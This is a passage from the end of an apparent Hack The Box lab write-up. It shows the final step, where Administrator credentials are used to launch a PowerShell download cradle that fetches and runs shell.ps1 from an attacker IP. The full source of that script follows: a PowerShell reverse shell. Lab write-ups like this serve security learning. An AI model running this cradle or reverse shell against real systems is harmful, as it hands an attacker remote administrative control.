+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$SecPass = ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;pass&gt;&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$cred = New-Object System. Management.Automation.PSCredential(<span style="color:#e6db74">&#39;Administrator&#39;</span>, $SecPass)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\svc_minecraft\Desktop\&gt; Start-Process -FilePath <span style="color:#e6db74">&#34;powershell&#34;</span> -argumentlist <span style="color:#e6db74">&#34;IEX(New-ObjectNet.WebClient).downloadString(&#39;http://10.10.14.9/shell.ps1&#39;)&#34;</span> -Credential $cred
+</span></span></code></pre></div><ul>
+<li>shell.ps1</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$LHOST = <span style="color:#e6db74">&#34;10.10.14.9&#34;</span>; $LPORT = <span style="color:#ae81ff">9001</span>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] <span style="color:#ae81ff">1024</span>; <span style="color:#66d9ef">while</span> ($TCPClient.Connected) { <span style="color:#66d9ef">while</span> ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, <span style="color:#ae81ff">0</span>, $Buffer.Length); $Code = ([<span style="color:#66d9ef">text.encoding</span>]::UTF8).GetString($Buffer, <span style="color:#ae81ff">0</span>, $RawData <span style="color:#ae81ff">-1</span>) }; <span style="color:#66d9ef">if</span> ($TCPClient.Connected <span style="color:#f92672">-and</span> $Code.Length <span style="color:#f92672">-gt</span> <span style="color:#ae81ff">1</span>) { $Output = <span style="color:#66d9ef">try</span> { Invoke-Expression ($Code) <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> } <span style="color:#66d9ef">catch</span> { $_ }; $StreamWriter.Write(<span style="color:#e6db74">&#34;</span>$Output<span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+</span></span></code></pre></div><ul>
+<li>Run and get the <code>root</code> flag.</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/1833e42779f53b86519d263eef0543eb.png" alt=""></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://sysevil.github.io/htb/twomillion/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Twomillion</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
